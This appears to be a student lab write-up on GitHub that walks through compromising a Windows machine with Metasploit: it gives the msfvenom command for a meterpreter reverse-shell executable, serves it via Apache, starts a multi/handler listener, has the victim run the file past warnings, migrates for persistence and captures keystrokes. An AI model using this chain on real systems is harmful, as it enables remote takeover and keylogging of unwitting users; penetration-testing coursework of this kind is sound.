# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/5aceb2fa-25e0-4ae6-ac13-3de3b48efe03)

Create a malicious executable file fun.exe using msenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/7fe8a848-6e3d-45ea-a7a8-409c903ade20)

copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/1ee02a35-1c98-4bcc-ac54-3679af50083a)

Start apache server

sudo systemctl apache2 start

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/819e0e70-907f-40f6-8670-0706f52a06df)

Check the status of apache2

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/a9b6919e-25c8-4921-95d3-b7565f947cd3)

## Invoke msfconsole:

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/fab5b21c-0b93-4752-b1bb-115835a0ab26)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/a70f58af-8445-437c-ada8-fba6a870cd8c)

Starting a command and control Server

use multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

exploit

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/b5e4b16f-9776-4519-b9c2-cd43879bc44f)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:

http://192.168.1.2/fun.exe

The file "fun.exe" downloads.

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/e3c17188-41b6-464c-90c7-54a52737541c)

Bypass any warning boxes, double-click the file, and allow it to run.

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/83b488f1-edd1-4bf1-a608-d797b14cd200)

On kali give the command exploit

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/28b660ed-8c94-4a6d-ad83-2369d28509e4)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/026b0b0e-7bdc-4356-bede-0e0074a58a35)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.

To become more persistent, we'll migrate to a process that will last longer.

Let's migrate to the winlogon process.

At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:

netstat

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.

Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/f6304e01-ea0b-44ea-bbf5-1304ca54bf06)

## Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. 

On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/2f1d7815-61c8-4715-8c4d-514087c91eb6)

![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/64ad24af-a705-493a-8a70-7f016a76d058)

keyscan_dump	Shows the keystrokes captured so far

## OUTPUT:
![image](https://github.com/Karthikeyan21001828/Compromising-windows-using-Metasploit/assets/93427303/15f1ddea-0798-4009-8f0d-08d524f9b98b)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
